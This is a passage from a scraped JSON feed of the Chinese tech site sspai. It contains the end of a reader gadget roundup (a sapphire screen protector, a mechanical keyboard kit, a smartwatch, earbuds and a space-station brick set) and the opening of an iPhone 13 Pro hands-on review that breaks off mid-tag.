用了三个月伤痕累累，然后电商同事给我整了一个蓝宝石屏幕膜，开始我对这个「蓝宝石」是持怀疑态度的，这材质一直是高端手表和手机镜头的专用零件，怎么会做成贴膜呢？半信半疑贴上用了一个月，竟然丝毫划痕都没有，我再研究一下这个厂商，还真是蓝宝石制造商，而且还是个上市公司。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana4db34teh0gc1dpg.jpeg\"></figure><p>从去年底用到今年 9 月，竟然还是没有可见划痕，这期间掉到地板上四五次，虽然不算很高，但屏幕跟细石英摩擦，多少也会有痕迹，但确实没有，可见蓝宝石是真的强。但磕在坚硬的石头上会不会碎，我是真没敢测试，但至少日常的环境中的屏幕摩擦，肯定没问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana5db34teh5fkvde0.jpeg\"></figure><p>前两天去换了个 iPhone 13 mini，想着超瓷晶面板，晚两天再贴膜也没事，结果仔细一看，在听筒下方已经产生了深深的刮痕，我估计是跟我之前写过的耳机壳一起放口袋导致的，因为那个壳子有一圈铝板。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana5tb34teh5fkvdeg.jpeg\"></figure><p>还能怎么办呢，赶紧亡羊补牢吧，重新贴上针对 iPhone mini 的蓝宝石贴膜，依然爽滑，只是那个刮痕已经没法掩盖了。我来形容一下蓝宝石膜的大概感觉，就跟新 iPhone 摄影头的镜片触感差不多，同样蓝宝石材质，耐刮不易粘指纹，个人感觉比原屏幕触感还要舒服一些。</p>\n<h2>@南鱼祭酒：腹灵 MK870 键盘套件 </h2>\n<ul>\n<li>购买渠道：京东第三方店铺</li>\n<li>入手价格：229（同款目前四种颜色，普通白壳 199、黑色透明壳 219、蓝色透明壳与粉色透明壳都是 229）</li>\n<li>下单及签收日期：2021 年 8 月 16 日-18 日</li>\n</ul>\n<p>腹灵算是这两年混得比较风生水起的国内键盘大厂，一把 FL980 堪称一线网红键盘，他们家的键盘我也用过不少，除了 FL980 之外还用过 F11 和 GP108，手感都非常稳，大键调教得很好，用键圈大佬们的话来说，就是能「开箱即用」。因为这样的好印象，腹灵自然就进入我的信任白名单，买他们家的键盘基本上不用太担心。</p>\n<p>几个月前腹灵推出了 MK870 键盘套件，我也默默观察了很久，蹲了不少评测视频。这副套件最开始只有普通白色款和黑色透明款（黑透贵 20 块），我个人不是特别满意。果然，前几天腹灵又出了少女蓝、猛男粉两个新配色（比黑透再贵 10 块），我在哔站观摩了几个开箱视频以后，就果断下单了。</p>\n<blockquote><p>这里小小解释一下，所谓的键盘套件，就是一把键盘拆掉键帽和轴之外，其他部分拿出来卖，也就是说你收到套件以后，组装起来（有的是厂家帮你组装好的，比如 MK870），插上自己的轴和键帽就可以用了。这样做的好处显而易见，大多数键盘玩家，会不断地换轴、换键帽来满足自己对新鲜感的需求，或者自己有非常满意的一套轴体和键帽，他们是不需要厂家提供的轴或者键帽的，所以键盘套件也就成了所谓客制化键盘最常见的一种售卖方式。</p></blockquote>\n<p>京东的这家第三方店铺相当靠谱，虽然不是京东物流但也是顺丰发货，包装扎实（开箱照欠奉）。拆开以后，果然跟预想的差不太多。塑料透明壳，颜值不说顶级也是别有一番风味，这放在手机界就叫探索版是吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/9dc9ea0e218fc91ec71af7bfda5be8fa.jpg\"><figcaption>鸟瞰图，还不错。</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/27a7becf89121dcaade547954cb458cf.jpg\"><figcaption>探索版！</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/34fa4e724db3193a3d7075d96d7971e5.jpg\"><figcaption>仔细看的话能看到底座还标明了每个键的键名，方便插键。挺贴心的。</figcaption></figure><figure class=\"ss-imgRows\" figcaption=\" 插电以后看看灯效。\"><img src=\"https://cdn.sspai.com/2021/08/31/dbd5a9aec603a4e7ba5f10975a7497ed.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/31/d0819965b9d92e4c82843364876260d5.jpg\" alt=\"\"></figure><p>这副套件虽然是单模，但是居然在左右两侧和前方都有 type-c 插口，这也不用考虑得这么周到吧！不过在哔站看评论有人说这是为后面上扩展（比如小键盘、鼠标什么的）预留的，这倒可以期待一下。</p>\n<p>手头正好有一套闲置的凯华 BOX 红轴、一套新到的爱尔兰键帽，就先用这两套试一下吧。（不过写这篇小文的时候轴体已经换成佳达隆 G 黄 pro 了。）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/c7db4f016ff0bfdf850ffb468aeefdb7.jpg\"><figcaption>闲置的轴和键帽。准备安上。</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/91f9e477db121273efa2ab66a66a9f57.jpg\"><figcaption>完成。</figcaption></figure><figure class=\"ss-imgRows\" figcaption=\" 带键帽的灯效。\"><img src=\"https://cdn.sspai.com/2021/08/31/291a92f253eeeee582170ff6f621069b.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/31/8d6a1651415a37b0e29230bb91affd5a.jpg\" alt=\"\"></figure><p>当我换成佳达隆 G 黄 pro 轴之后再打字，这手感跟我的 F11 几乎没有区别（我的 F11 就是佳达隆 G 黄 pro 轴），由于这两款的配列都是 87，我一度感觉这 MK870 就是 F11 拔了键帽和轴拿出来卖的——掐指一算，F11 价格 399，轴 90 块左右，白面水绿键帽 100，再减去三模和单模的差价，还真是跟 MK870 的白壳款差不多😂（当然了厂家进货跟零售肯定不一个价，领会精神。）</p>\n<p>最后总结一下，腹灵 MK870 键盘套件在 200 元左右这个价位来说堪称性价比很高，非常适合对轴体和键帽有个性追求但又不想上高价买铝块的玩家（比如我），腹灵对于键盘的调教也非常到位，不用继续折腾。但是对于少数派作者和读者来说，有两点可能算是劝退，一个是只有单模不支持蓝牙，另一个是不支持 Mac 配列——但是如果你不是特别依赖 F 键的话，这个问题只要在设置里调换一下 command 和 option 的键位就能解决。</p>\n<p><s>（更多信息大家可以去哔站搜相关评测视频，键圈都快成玄学了，键盘好不好用先看大键声音够不够肉，敢情你这键盘是 TNT 啊，靠打字音出字？）</s></p>\n<h2>@潮玩生活加：Ticwatch E3 和 Pixel Buds A-Series</h2>\n<h3>Ticwatch E3</h3>\n<p>告别三星的手机以后，在其他设备上搭配 Galaxy Watch 就是一件特别繁琐的事。以 Pixel 设备为例，先要安装三星的 Wearable 应用，然后还要下载 Watch 插件，若要实现通知推送则要安装三星为可穿戴设备设计的 Accessory Service，最后还需要三星健康实现传感器数据的同步。一个手表，四个应用，很三星。尽管很想换 Wear OS 设备来精简整个使用体验，无奈当时关于哪些设备能升级仍旧没有确切的说法，看来手腕上的 Watch Active2 还能用很久。</p>\n<p>直到七月底，谷歌通过一则社区贴文宣布了 <a href=\"https://support.google.com/wearos/thread/118166873/what-wear-os-3-means-for-you?hl=en&amp;msgid=118166873\" target=\"_blank\">Wear OS 3 的升级计划</a>。堪比 Windows Phone 8 的升级策略和漫长的等待可以说是给这个备受瞩目的系统判了个缓刑，但好歹给我打了一针安慰剂，终于、终于可以下单收藏很久的 Ticwatch （出门问问）新款入门级手表 E3。</p>\n<figure class=\"ss-imgRows\" figcaption=\"出门问问启动器和屏幕大黑边\"><img src=\"https://cdn.sspai.com/2021/09/12/316eb9f0b7da0aad4c9f92dc71ef4173.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/12/9c732fe75d7ad7131f14d237b83edeba.jpg\" alt=\"\"></figure><p>近几年也用过 Wear OS 设备，大多是使用骁龙 2100 或 3100 的手表，全都能用「中看不中用」描述——续航短、反应慢、操作等半天，真真切切只能用来看时间。E3 搭载的 4100 芯片和 1GB 内存终于让 Wear OS 像 watchOS 或 Tizen 那样轻快，任何操作都会在三秒内给出反馈，不再有转圈圈到息屏的无奈等候。除了没有心电图功能，该有的传感器和功能一应俱全，可以实现全天候不间断的运动和心率检测（包含异常心率提醒），自动感应睡眠状态并在夜间启用血氧监测，另外还预装了噪声与压力监测应用。不过这里有一个前提，就是所有的全天候检测——步数记录以外——都需要出门问问自家的应用，预载的 Google Fit 只能够记录步数和识别运动，不能在后台调用传感器自动记录心率。显然出门问问想要在 Wear OS 的基础上搭建属于自己的运动健康生态，意图明显到做了独有的启动器来推广自家应用，考虑到 Fit 平台的局限性，也不能说是个糟糕的决定。</p>\n<figure class=\"ss-imgRows\" figcaption=\"阴影处和阳光直射时屏幕可视程度比较\"><img src=\"https://cdn.sspai.com/2021/09/12/5fdc94bc094de163cdb96f6870c373d0.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/12/2d2d159c88015d696b69a26e93975ee5.jpg\" alt=\"\"></figure><p>为了实现高配平价，E3 做了很多妥协。非曲面的屏幕玻璃显得太多方正，全塑料机身轻便但廉价，橡胶表带不舒服到戴了几天就换第三方表带。它真正的大短板是它的屏幕，先不说屏幕外围比 Pixel 3 XL 刘海还粗的跑马边，这块屏幕使用的是 LCD 材质，不是常见的 OLED 材质，这代表着色彩表现一般，黑色不够深邃，屏幕常显也失去了意义。更要命的是，没有自动亮度调节，室内或多云天气亮度表现尚可的情况下，在阳光直射下几乎看不清屏幕内容。用朴实的价格换到能够升级 Wear OS 3 的硬件也不算是个坏交易，大晴天就抬手遮一遮，也不是不能用。</p>\n<h3>Pixel Buds A-Series</h3>\n<p>和换掉 Galaxy Watch 的里有差不多，原本在用 Galaxy Buds Pro（以下简称 Buds Pro），手机上要装插件才能控制耳机的行为，没有（能用的）语音助手使得在厨房一边做菜一边换音乐变得很麻烦。趁着线下商家的会员专享活动买了新出的大家都说好 <a href=\"https://youtu.be/lRSxREh_amU\" target=\"_blank\">Pixel Buds A-Series</a> 耳机（以下简称 Buds A），着实体验到了大家都说好是真的好。</p> <p>首先必须夸奖的是 Buds A 的耳机壳太棒了，握起来是颗小小的鹅卵石，盖子开合清脆有利，比 Buds Pro 松垮但吸力过强的壳子好上太多。（我不会把视频转 90 度，你们就歪着头看吧。）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/465e5017b46acc2729c1e8b257509578.jpg\"><figcaption>圆润造型，胀痛拜拜</figcaption></figure><p>耳机没有使用经过市场验证的经典设计，沿袭了第一代 Pixel Buds 的喇叭口半入耳式形态，和耳朵接触的曲面部分（L/R 标识处）较 Buds Pro 圆润，短短的鱼鳍角让耳机能稳定地固定在耳朵里，但也避免长时间佩戴容易出现的胀痛感。半入耳的形态提升了佩戴的舒适性，可也使得噪音更容易冲入耳道，在公共交通上若是不提高音量怕是只能听到歌曲里的节奏，降噪性上和 EarPods 半斤八两。</p>\n<p>在这方面，谷歌的思考过程可能是这样的，反正已经在不间断地监听语音助手的唤醒词，何不如一直关注周遭的环境音来自动调节音量，从而曲线救国弥补降噪功能的缺失呢？暂且不谈对听力能力的影响，作为卖点宣传的「<a href=\"https://youtu.be/2MmAbDJK8YY?t=14\" target=\"_blank\">自适应音量</a>」听起来是个解决短时噪音的可行的方案，无奈现实环境里环境音复杂太多，体验说不上好，测试一次后我就再也没有开启过。当时的场景是戴着耳机去超市买菜，去超市的路上音量自动调节表现良好且稳定，直到我拉出一个超市购物推车，小轮子的滚动并不算吵，耳机听到这嘎吱嘎吱就直接提高了音量，推车不动了又降了下来。整个买菜的过程里，我走走停停，耳机音量高高低低，就像是美妙又折磨人的伴侣生活。关掉这个功能，Buds A 就又是那个让人喜爱的小耳机了。</p>\n<h2>@HarveyJanson：中国空间站套装 </h2>\n<ul>\n<li>入手渠道：淘宝自购（bilibili 旗舰店）</li>\n<li>入手价格：¥331.59（¥395 - ¥63.41）</li>\n</ul>\n<p>本来我就喜欢乐高类玩具。我国的空间站升空之后，我迷上了国产的航天主题砖。这类砖有不少厂家在出，比如 Keeppley、森宝、维思（也就是奥迪双钻）。偶然发现这款维思的空间站全套在 Bilibili 预售，就在 6 月 17 号下了单，辗转快两个月，终于在 8 月 13 号拿到了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16311771306214.jpeg\" alt=\"单看成品图感知不强，但这箱子真是庞大无比，非常社死\"><figcaption>单看成品图感知不强，但这箱子真是庞大无比，非常社死</figcaption></figure><p>这个空间站套装，自然是以正在建设的中国空间站为原型，包含已经在轨运行的天和核心舱、天舟二号货运飞船、神舟十二号载人飞船，以及即将升空的梦天、问天两个实验舱，分装五个盒子，总共将近 1,500 块砖，砖均单价不到两毛五，属于国产砖的正常价格区间。每盒大概四五包零件，并不是按照步骤分装的，需要先混起来再找件，所幸每盒件数都不多，不到 300，还算比较好找。但分装也有些欠考虑的地方：五盒砖只有第一盒（核心舱）给拆件器，只有第五盒（载人飞船）给总装的步骤，不知道厂家在设计之初，是不是就认定消费者一定会买全套；但既然一定买全套，又何苦分成五盒呢？拼装过程中，我也毫不意外地遇到了多件、错件的情况：比如三缺一的「梦天实验舱」，还有不得已而改名的「空中空间站」（因为有两个「空」）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16311771306298.jpeg\" alt=\"\"></figure><p>砖的质量整体还可以，就是珍珠色件比较糟糕，注塑痕迹极为明显。砖与砖组合的手感尚可，但有部分砖很紧，非常紧，紧到装的时候我都不知道怎么拆开。例如板件，居然还是等长、对齐、压死，为了组装严密，一点缝都不能留，组装的时候我就想「千万可别返工」，结果果不其然，部件方向搞混了，非拆到底不可，着实折磨。但愿国产砖以后能在设计合理性上再多下点功夫。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16311771306308.jpeg\" alt=\"这种结构真的拆无可拆，无从下手\"><figcaption>这种结构真的拆无可拆，无从下手</figcaption></figure><p>五盒玩具自然就有五本说明书。说明书纸质尚可，但模型清晰度不是特别高，就好像没开抗锯齿一样，稍有毛刺。有的件颜色与说明书不符，需要自行发挥一下。还有的示意图把乐高时有发生的阴间配色都学来了，简直看瞎我狗眼。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/c9bcaeb51ecf690b7a424b12d27cdb29.jpg\"><figcaption>左：锯齿还挺明显的；右：谁能看出来这底板是个啥结构</figcaption></figure><p>受限于比例尺，这套积木注定只能是「螺蛳壳里做道场」。但即便如此，厂家依然尽力做出了差异化和识别度。梦天、问天两个实验舱虽然件数一致，但仍在末端的「方 + 锥」和「圆 + 锥」上做出了区别，值得表扬。各个舱段的外形也极具辨识度，熟悉航天的读者估计一眼就能靠大体外形分出来载人飞船和货运飞船；不了解的也能通过这套积木学习一下这两个舱段的轮廓。至于天和核心舱标志性的机械臂，也做出来了，虽然不似本尊那么神通广大，但也能和乐高的 21321 掰掰手腕。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16311771306324.jpeg\" alt=\"给机械臂来个特写\"><figcaption>给机械臂来个特写</figcaption></figure><p>说到 21321（也就是乐高的国际空间站套装），我在拼我国空间站之前，先「试拼」了一下这套乐高的「假想敌」。由于航天师承不同，国际空间站和我国的空间站外形、结构都差别极大，拼起来完全是两种体验。但也能看出，相比之前拼过的其他国产航天积木，这套空间站明显有不少师自 21321 的地方。例如长帆板的设计，和乐高一样，用两根十字轴做主干，一侧一根，主体结构一体成型，自然稳定性、造型都更佳。而且相比 21321 的设计，我反而觉得这套国产空间站更胜一筹。21321 的不容易找对称、对齐，有点逼死强迫症那意思了。但欲戴王冠，必承其重。使用超长杆部件做主体结构，对十字轴的质量是一大考验。国产十字轴的质量还不是特别好，上手甚至就觉得有点软，使得实验舱的帆板多少有点向两侧下坠，影响美观。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16311771306331.jpg\" alt=\"这是「试拼」的 21321；可以记下太阳能帆板在两端与支架的连接方式\"><figcaption>这是「试拼」的 21321；可以记下太阳能帆板在两端与支架的连接方式</figcaption></figure><p>总的来说，这套积木还是非常适合航天爱好者入手的。整个东西拼起来可能占地面积确实有点夸张，但也的确气势恢弘。如果家里没有足够大的地方摆开这一摊（是的，「摊」），也可以不总装，而是化整为零，自由组合。我自己组装、欣赏这套积木的时候，就回想起自己像追剧一样，密切关注空间站发射每一场直播和转播，那种激动的心情，的确无以言表。今年的空间站发射，无异于给陷在「抄袭」这个泥淖里的国产积木猛推了一把，大有翻身之势。希望这个势头能维持下去。也顺祝我国航天事业一切顺利！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16311771306338.jpeg\" alt=\"\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16311771306345.jpeg\" alt=\"\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_harveyjanson/16311771306352.jpeg\" alt=\"唯一的遗憾就是这个牌子不对\"><figcaption>唯一的遗憾就是这个牌子不对</figcaption></figure><h2>彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ana6db34teh0gc1dq0.gif\"><figcaption>悲报：上班摸鱼玩游戏被老麦抓现行拍下</figcaption></figure><p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用至少 800 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69069"},{"title":"萤幕、影像、性能处处 Pro，一台没有「短板」的好手机：iPhone 13 Pro 体验","date":"2021-09-30 08:00:35","description":"\n<p>好巧不巧，我因为急性子不想等邮寄，稀里糊涂地就订到了首个发售日取货的机器，「谈新机」的担子自然落在了我的肩上。</p>\n<p>好在我还蛮适合以一个「最熟悉的陌生人」的身份聊聊这部新 iPhone。尽管我是绝对的 iPhone 老用户，但在过去的一年多里，我的主力机一直是 Android 设备，iPhone 11 Pro Max 只作为备用机使用，登场的机会不多，对 iOS 的体验也没有从前那么深入。在面对 iPhone 13 Pro 时，我也就多了一分「看看如今的 iPhone 旗舰发展得怎么样了」的心情。</p>\n<p>这篇文章中，我就谈谈我使用新 iPhone 一周以来的心得和感受。</p>\n<h2>外观：全金属小胖</h2>\n<p>和 iPhone 12 Pro 系列相比，iPhone 13 Pro 的整体外观变化不大，依旧采用正、反双面玻璃加不锈钢金属边框的设计，如果不考虑新配色「远峰蓝」的存在，拿着 iPhone 13 Pro 走在大街上，周围的路人很难一眼就注意到你手里拿着的是新手机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/9f0318d34986ebcec2b5f4d77f92eb0e.jpg\"></figure><p>就在我撰写本文期间，还发生了一件与此相关的小事：我拿着戴了手机壳的 iPhone 13 Pro 坐地铁，对面一位大哥看到了我手机上硕大的摄像头，觉察到了不对劲。我在他脸上看到了从惊讶到迟疑，再到「原来如此」的表情变化过程，非常有趣。</p>\n<p>对我个人来说，iPhone 13 Pro 在外观上最大的改变是摄像头模组变大了，而且变得巨大。尤其在佩戴了 Apple 自家的皮质保护壳之后，整个摄像头模组已经有了「半个手机都是摄像头」的气势。不仅如此，整机握在手中时的重心位置和手指空间也都因为摄像模组的变化而有所不同，即使仅仅把手机握在手里正常使用，也很难忽略背后那个巨大摄像头模组的存在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/3d3c91ebfccfb56970009449d5234c09.jpg\"></figure><p>iPhone 13 Pro 在外观上的另一大改变是 Face ID 模组变小了，也就是大家常说的「刘海变窄」。如果单纯把两部手机放在一起对比，前置模组的尺寸变化确实很明显，但就实际体验而言，两者区别不大。产生这种感受的原因在于：其一，前置模组变窄之后，两侧显示的内容没有变化，没有信息增量也就觉察不到视觉上的区别。其二，前置模组变窄的同时也微微地变高了，Apple 放大了两侧 icon 的显示比例，刻意在视觉上制造了与前代的近似的观感。两个因素加在一起，导致我上手玩了很久之后才想起来「刘海变窄」这件事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/0875159847c1a2effa364a52c18bc8bf.jpg\"><figcaption>iPhone 13 Pro（左）与 iPhone 11 Pro 的前置模组对比，放在一起看区别还是很明显的，能看出 iPhone 13 Pro 的「耳朵」区域的显示内容都等比例放大了</figcaption></figure><p>我此前猜想前置模组的变化会不会提升戴口罩的识别效率，实际测试后发现完全没有。根据其它媒体的拆机报告显示，前置模组的硬体结构有所调整，但 Apple 是否针对戴口罩的学习算法进行了优化还需要使用一段时间之后再检验效果。</p>\n<p>还有朋友问到新的不锈钢边框是否改善了容易沾染指纹的问题，答案也是没有。根据一些媒体报道和传言来看，iPhone 13 Pro 的部分型号可能使用了新工艺，但无论从视觉上还是握感来说，iPhone 13 Pro 的不锈钢边框仍然是地地道道的不锈钢——一把摸上去，留下的自然也是地地道道的指纹。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/f27b58e8a060c19281b485729e780c4a.jpg\"></figure><p>iPhone 13 Pro 还有一个外观上的「隐藏」变化，即重量变重了。和两代手机在外观上的其它差别类似，如果把 12 Pro 和 13 Pro 同时拿起来，的确能明显分辨出两机在重量上的差异，但我已经用惯了各种重量的手机，所以只觉得 13 Pro 有点分量，却不觉得它重到了不能接受或者出门不想带的地步。「半斤重的手机咱都用过，爷还怕你这个？」</p>\n<p>总体来说，iPhone 13 Pro 在外观上给我的整体感受就是一个金属质感强烈的小胖子——造型圆滚滚，手感沉甸甸，不锈钢边框闪亮亮，背后还有三个导弹发射井般的摄像头。Apple 擅长的「高级感」和优秀做工依然健在，诸多设计上的变化也谈不上进步或退步，一言以蔽之——它还是那个 iPhone。</p>\n<h2>萤幕：自然而然的 ProMotion</h2>\n<p>iPhone 13 Pro 在萤幕方面最受关注的升级点，无疑是可以动态调节刷新率的 ProMotion 技术。</p>\n<p>和 Android 厂商推出的高刷屏不同，即使首次使用，ProMotion 也不会让你觉得「快到轰头」。相反，流畅的非线性动画及人机交互等早已是 iOS 引以为傲的视觉特性，所以对于 iPhone 老用户而言，开启 ProMotion 之后未必会觉察到任何巨大飞跃，只会觉得「哪里似乎细微地变快了一点」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/f95b20045114df4b8e68b6b722477707.jpg\"></figure><p>让我明确觉得「这都是 ProMotion 在起作用」的部分是进行涉及「跳转」的操作，譬如多任务切换、返回上一层和切入主屏等。在我常用的 iPhone 11 Pro Max 上，这些动画的末尾偶尔会有掉帧的现象，但在 iPhone 13 Pro 上则完全没有，一路流畅。</p>\n<p>不仅如此，我还能明确感知到新手机在触控响应速度上的提升。iOS 内原本就有大量涉及拖拽、划动的手势，在 iPhone 13 Pro 上，使用这些手势会更加顺滑和跟手，有着一种微妙的细腻。</p>\n<video class=\"ss-videoSource video-js\" controls=\"\" poster=\"\" title=\"\" type=\"video/mp4\" preload=\"none\"><source src=\"https://cdn.sspai.com/video/iphone13pro/promotion.mp4\" type=\"video/mp4\"></source></video><p>⬆️ 通过升格拍摄，能明显看出 iPhone 13 Pro 在刷新率和触控采样率上的提升，但使用中需要更敏锐才能感受得到。</p>\n<p>在日常使用之外，ProMotion 还能在游戏中发挥优势。iPhone 13 新品发布会上曾展示过一个名为 <i>Catalyst Black</i> 的对战游戏，我拿到了这款游戏的 DEMO 体验机会，刚好可以测试一下 ProMotion 的游戏体验。<i>Catalyst Black</i> 和国内玩家熟悉的《王者荣耀》近似，玩家分为红蓝两队，以对角线的方向向对方进攻。游戏目前分为 Slayer（生存模式）、Capture The Flag（抢旗模式）和 Eventide（末日守护模式）三种对战形式，单看名字就能大致了解对应的玩法。</p>\n<p>我在测试中主要尝试了 Slayer 模式，该模式没有特殊目标，以击杀对方人数达到一定数量为标准，节奏非常爽快，熟悉 MOBA 的玩家肯定都能迅速上手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/b38bdb796b0040a42db16e1cea686198.JPEG\"><figcaption>Catalyst Black 的游戏画面</figcaption></figure><p>游戏进行中，我最能感受到高刷新率的部分有两个，其一是场景中的动态元素，其二是介面切换的过程。另外，对战游戏对触控刷新率要求很高，ProMotion 也对游戏体验帮助很大。由于 <i>Catalyst Black</i> 还在测试中，我所玩到 DEMO 版也只能进行本地游戏，所以更多关于游戏本身的内容就不在本文中多谈啦，等正式版上市之后有机会再聊。</p>\n<p>其实，对于像我这样用了很久 iPad Pro 的用户来说，ProMotion 早已不是新鲜事物，它登陆 iPhone 更像是一种「理所应当」——「iOS 加 ProMotion」才是 iPhone 视觉体验和交互上的完全形态。</p>\n<p>不过，虽然 Apple 表示过大部分开发者什么都不用做就能让自己的 app 适应 ProMotion，但我在使用中还是遇到了某些 app 因为未适配 ProMotion 而产生的掉帧问题。这些问题都不影响正常操作，不仔细看也很难觉察。新机刚上市，第三方 app 未完全适配新特性的情况不可避免，就给开发者们一点研究和更新的时间吧。</p>\n<p>总体来说，ProMotion 可以带来明确的感知，而且会越用越喜欢。科技博主们评价高刷屏时常用「用过了就回不去」来形容，这句话用在 iPhone 13 Pro 身上才更为贴切——有 ProMotion 的动态刷新率和 iOS 系统动画相互配合，这种体验确实用了就不想回去。</p>\n<p>另外，除了 ProMotion，iPhone 13 Pro 在萤幕基础素质上的提升也没拉下，其中之一就是被大家忽略了的室外亮度提升。拿到新机之后，我跟着老麦参加了特斯拉西部之旅的车主聚会，并在下午两点顶着炎炎烈日拍了不少照片。拍摄期间，我甚至直接迎着太阳直射的光线来查看显示状态，萤幕依然清晰可见，让我小小地震惊了一下。至于色准和影音观感，都是 iPhone 的传统优势，优秀程度无需多言。</p>\n<h2>影像：这就是 iPhone </h2>\n<p>如果用一句话来概括 iPhone 13 Pro 的影像体验，那就是「这很 iPhone」。和上代产品相比，三颗摄像头的基本配置没变，但每颗都有硬体层面的改进，所以 iPhone 13 Pro 在影像上没有激进的变化，而是继续保持优点和特色。与此同时，部分问题也被继承下来，没能得到完全改善。</p>\n<p>好吧，我忍不住要先谈谈「鬼影」了。在发布会谈到影像时，我内心就只有一句话：先把「鬼影」改了，别的都好说。拿到真机之后一测，才发现「鬼影」鬼得实实在在，原汁原味。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/2d8d6d5212577d044fc92ef83e0ac98c.jpg\"><figcaption>「妈妈，你看那有两个绿色的小人。」<br>「哪有什么小人，死孩子不要乱讲话！」</figcaption></figure><p>iPhone 的「鬼影」问题已经不是「躲着点儿拍就行」这么简单了。Apple 有着手机领域最专业的影像团队和实力，在连续多代产品上搞出这么个功能缺陷，我一直觉得很不应该。我相信 Apple 肯定知道这个问题并且有能力改进，希望下一代 iPhone 拍照时不用再躲着拍了。</p>\n<p><strong>注：</strong>下文样张均未使用第三方工具修改，部分照片有裁切处理或使用系统自带的自动照片优化。</p>\n<p>吐槽之后，我们来正式聊聊 iPhone 13 Pro 的影像系统。和之前的 iPhone 一样，iPhone 13 Pro 延续了 Apple 的特色——力求色彩自然，及拍摄体验顺畅。</p>\n<p>在光线明亮的白天，三颗摄像头的白平衡非常准确，能展现漂亮的色彩，且对光影变化非常敏感，让照片呈现出一种饱满的质感。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/29/5b79030af44babb60ac055e770ed466a.jpg\"><figcaption>26 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/1731c7453336082cb39dccb6a24fac7e.jpg\"><figcaption>26 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/6eb40f6712616a9ffb1e7a0aca858765.jpeg\"><figcaption>26 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/5ab5e678aa305e4b1f8f0df01472b6f6.jpeg\"><figcaption>13 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/5e63b5a16971e082727adce459b9ea36.jpeg\"><figcaption>13 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/5d0d3f3f2f57187970ac4a04abaa0107.jpeg\"><figcaption>13 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/27/f586ba2b8443aa66a7adfd3ce67ad700.jpg\"><figcaption>77 mm</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img 